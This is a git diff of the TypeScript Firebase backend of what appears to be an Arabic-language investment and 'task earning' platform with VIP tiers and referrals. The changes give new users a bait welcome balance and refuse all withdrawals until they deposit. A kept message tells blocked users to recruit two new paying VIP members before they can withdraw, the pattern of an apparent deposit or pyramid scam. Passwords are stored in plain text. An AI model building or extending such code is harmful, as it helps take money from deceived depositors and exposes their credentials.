@@ -69,18 +69,27 @@ export function getLastFirestoreError(): string {
 
 function checkForQuotaExceeded(error: any) {
   if (!error) return;
-  console.error("🔴 Firestore Operation Error occurred:", error);
   const errMsg = error.message || String(error);
+  if (errMsg === 'local-fallback-active') return;
+  if (errMsg === 'firestore-operation-timeout' && useLocalStorageFallback) return;
+
+  if (errMsg !== 'firestore-operation-timeout') {
+    console.error("🔴 Firestore Operation Error occurred:", error);
+  } else {
+    console.warn("⏳ Firestore Operation Timeout occurred. Attempting to manage...");
+  }
+  
   lastFirestoreError = errMsg;
   const errCode = error.code || '';
   if (
     errMsg.includes('Quota exceeded') ||
     errMsg.includes('Quota limit exceeded') ||
     errMsg.includes('RESOURCE_EXHAUSTED') ||
-    errCode === 'resource-exhausted'
+    errCode === 'resource-exhausted' ||
+    errMsg === 'firestore-operation-timeout'
   ) {
     if (!useLocalStorageFallback) {
-      console.warn("⚠️ Firebase Quota Limit Exceeded detected! Activating Local Storage Fallback Mode.");
+      console.warn("⚠️ Firebase Quota or Timeout detected! Activating Local Storage Fallback Mode.");
       useLocalStorageFallback = true;
       try {
         localStorage.setItem('oxlo_quota_fallback_active', 'true');
@@ -388,7 +397,9 @@ function getLocalSettings(): SystemSettings {
     supportAgentAvatar: "/support_logo.jpg",
     supportFaqs: defaultSupportFaqs,
     tasksCode: "",
-    hideTrialPlans: false
+    hideTrialPlans: false,
+    signalGroupLink: "",
+    showSignalGroup: true
   };
   localStorage.setItem('local_db_settings', JSON.stringify(initial));
   return initial;
@@ -681,11 +692,13 @@ export async function registerUser(username: string, phone: string, password: st
     inviteCode: generateInviteCode(),
     referrerCode: finalReferrer,
     walletAddress: "",
-    earnings: 0,
+    earnings: 10,
     taskIncome: 0,
     effectiveDays: 0,
     role: "user",
     vipTier: "",
+    isWithdrawalBlocked: false,
+    hasDeposited: false,
     vipStartDate: new Date().toISOString(),
     createdAt: new Date().toISOString(),
     lastLoginAt: new Date().toISOString(),
@@ -1076,7 +1089,9 @@ export async function getSystemSettings(): Promise<SystemSettings> {
         supportAgentAvatar: data.supportAgentAvatar || "/support_logo.jpg",
         supportFaqs: (data.supportFaqs && data.supportFaqs.length > 4 && data.supportFaqs.some((f: any) => f.question.includes("تأسست"))) ? data.supportFaqs : defaultSupportFaqs,
         tasksCode: data.tasksCode ?? "",
-        hideTrialPlans: data.hideTrialPlans !== undefined ? Boolean(data.hideTrialPlans) : false
+        hideTrialPlans: data.hideTrialPlans !== undefined ? Boolean(data.hideTrialPlans) : false,
+        signalGroupLink: data.signalGroupLink ?? "",
+        showSignalGroup: data.showSignalGroup !== undefined ? Boolean(data.showSignalGroup) : true
       };
     }
     const def = getLocalSettings();
@@ -1220,6 +1235,7 @@ export async function updateDepositStatus(depositId: string, status: 'approved' 
       const users = getLocalUsers();
       if (users[phone]) {
         users[phone].earnings += amount;
+        users[phone].hasDeposited = true;
         saveLocalUsers(users);
       }
     }
@@ -1233,7 +1249,8 @@ export async function updateDepositStatus(depositId: string, status: 'approved' 
     if (status === 'approved') {
       const userRef = doc(db, "users", phone);
       await updateDoc(userRef, {
-        earnings: increment(amount)
+        earnings: increment(amount),
+        hasDeposited: true
       });
     }
   } catch (error) {
@@ -1249,6 +1266,7 @@ export async function updateDepositStatus(depositId: string, status: 'approved' 
       const users = getLocalUsers();
       if (users[phone]) {
         users[phone].earnings += amount;
+        users[phone].hasDeposited = true;
         saveLocalUsers(users);
       }
     }
@@ -1277,6 +1295,11 @@ export async function createWithdrawal(
     if (!users[phone]) {
       throw new Error("المستخدم غير موجود");
     }
+    // 1. فحص الإيداع أولاً (الأولوية القصوى)
+    if (users[phone].hasDeposited !== true) {
+      throw new Error("⚠️ عذراً! لا يمكنك سحب الأرباح أو المكافأة الترحيبية إلا بعد إيداع وتفعيل باقتك الاستثمارية الأولى في المنصة.");
+    }
+    // 2. ثم فحص الحظر اليدوي أو الأمني
     if (users[phone].isWithdrawalBlocked) {
       throw new Error("🔒 نأسف لإعلامك بأنه قد تم تعليق ميزة السحب مؤقتاً لحسابك لدواعي الأمان والتحقق من جودة النشاط. لتفعيل السحب التلقائي مجدداً ومواصلة العمل وجني الأرباح بشكل طبيعي، يرجى دعوة (2) من المشتركين الجدد والنشطين على الأقل للترقية فئة VIP (B1) باستخدام رابط الإحالة الخاص بك. نشكر تفهمكم وحرصكم على استدامة المجتمع الرقمي للمنصة.");
     }
@@ -1315,6 +1338,11 @@ export async function createWithdrawal(
       throw new Error("المستخدم غير موجود");
     }
     const userData = userSnap.data() as User;
+    // 1. فحص الإيداع أولاً (الأولوية القصوى)
+    if (userData.hasDeposited !== true) {
+      throw new Error("⚠️ عذراً! لا يمكنك سحب الأرباح أو المكافأة الترحيبية إلا بعد إيداع وتفعيل باقتك الاستثمارية الأولى في المنصة.");
+    }
+    // 2. ثم فحص الحظر اليدوي أو الأمني
     if (userData.isWithdrawalBlocked) {
       throw new Error("🔒 نأسف لإعلامك بأنه قد تم تعليق ميزة السحب مؤقتاً لحسابك لدواعي الأمان والتحقق من جودة النشاط. لتفعيل السحب التلقائي مجدداً ومواصلة العمل وجني الأرباح بشكل طبيعي، يرجى دعوة (2) من المشتركين الجدد والنشطين على الأقل للترقية فئة VIP (B1) باستخدام رابط الإحالة الخاص بك. نشكر تفهمكم وحرصكم على استدامة المجتمع الرقمي للمنصة.");
     }
@@ -1543,7 +1571,6 @@ export function subscribeToReferralTeam(myInviteCode: string, callback: (team: U
 
 // 9. All Users (For Admin dashboard)
 export async function getAllUsers(): Promise<User[]> {
-  const localMap = getLocalUsers();
   try {
     const querySnapshot = await getDocs(collection(db, "users"));
     const firestoreMap: Record<string, User> = {};
@@ -1555,13 +1582,12 @@ export async function getAllUsers(): Promise<User[]> {
       }
     });
 
-    const mergedMap: Record<string, User> = { ...localMap, ...firestoreMap };
-
-    saveLocalUsers(mergedMap);
-    return Object.values(mergedMap);
+    saveLocalUsers(firestoreMap);
+    const finalMap = getLocalUsers(); // This automatically ensures the main admin account is present
+    return Object.values(finalMap);
   } catch (error: any) {
     console.warn("Firestore getAllUsers error, falling back to local storage:", error);
-    return Object.values(localMap);
+    return Object.values(getLocalUsers());
   }
 }
 
@@ -1571,7 +1597,6 @@ export function subscribeToAllUsers(callback: (users: User[]) => void): () => vo
   };
 
   return safeOnSnapshot(collection(db, "users"), (snapshot) => {
-    const localMap = getLocalUsers();
     const firestoreMap: Record<string, User> = {};
     snapshot.forEach((docSnap) => {
       const data = docSnap.data() as User;
@@ -1581,17 +1606,18 @@ export function subscribeToAllUsers(callback: (users: User[]) => void): () => vo
       }
     });
 
-    const mergedMap: Record<string, User> = { ...localMap, ...firestoreMap };
+    saveLocalUsers(firestoreMap);
+    const finalMap = getLocalUsers(); // Automatically adds/ensures admin user
 
     // Ensure ONLY 07519952000 has admin role
-    Object.keys(mergedMap).forEach(k => {
-      if (k !== "07519952000" && mergedMap[k]?.phone !== "07519952000" && mergedMap[k]?.role === "admin") {
-        mergedMap[k].role = "user";
+    Object.keys(finalMap).forEach(k => {
+      if (k !== "07519952000" && finalMap[k]?.phone !== "07519952000" && finalMap[k]?.role === "admin") {
+        finalMap[k].role = "user";
       }
     });
 
-    saveLocalUsers(mergedMap);
-    callback(Object.values(mergedMap));
+    saveLocalUsers(finalMap);
+    callback(Object.values(finalMap));
   }, (error) => {
     console.warn("Firestore subscribeToAllUsers error:", error);
   }, handleFallback);
@@ -1799,6 +1825,10 @@ export async function updateUserByAdmin(phoneOrId: string, updates: Partial<User
   const finalUpdates: Partial<User> = { ...updates };
   if (updates.password) {
     finalUpdates.rawPassword = updates.password;
+  }
+  
+  if (updates.vipTier && updates.vipTier !== "" && updates.vipTier !== "العضوية العادية") {
+    finalUpdates.hasDeposited = true;
   }
 
   // 1. ALWAYS write to local cache robustly across all matching keys
@@ -2374,7 +2404,9 @@ export function subscribeToSystemSettings(onUpdate: (settings: SystemSettings) =
         supportFaqs: (data.supportFaqs && data.supportFaqs.length > 4 && data.supportFaqs.some((f: any) => f.question.includes("تأسست"))) ? data.supportFaqs : defaultSupportFaqs,
         tasksCode: data.tasksCode ?? "",
         hideTrialPlans: data.hideTrialPlans !== undefined ? Boolean(data.hideTrialPlans) : false,
-        telegramSupportUsername: data.telegramSupportUsername ?? ""
+        telegramSupportUsername: data.telegramSupportUsername ?? "",
+        signalGroupLink: data.signalGroupLink ?? "",
+        showSignalGroup: data.showSignalGroup !== undefined ? Boolean(data.showSignalGroup) : true
       });
     } else {
       onUpdate(getLocalSettings());
